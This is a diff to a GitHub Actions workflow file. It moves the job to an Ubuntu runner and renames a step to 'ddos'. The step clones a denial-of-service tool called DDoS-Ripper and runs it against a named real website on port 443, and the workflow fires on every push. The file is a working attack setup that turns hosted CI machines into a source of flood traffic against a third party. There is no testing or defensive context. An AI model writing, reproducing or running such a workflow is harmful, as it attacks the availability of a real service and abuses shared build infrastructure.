@@ -5,10 +5,10 @@ on: [push, workflow_dispatch]
 jobs:
   build:
 
-    runs-on: windows-latest
+    runs-on: ubuntu-latest
 
     steps:
     - name: Download
       run: git clone https://github.com/palahsu/DDoS-Ripper
-    - name: cd
+    - name: ddos
       run: cd DDoS-Ripper && python3 DRipper.py -s lahelu.com -t 443
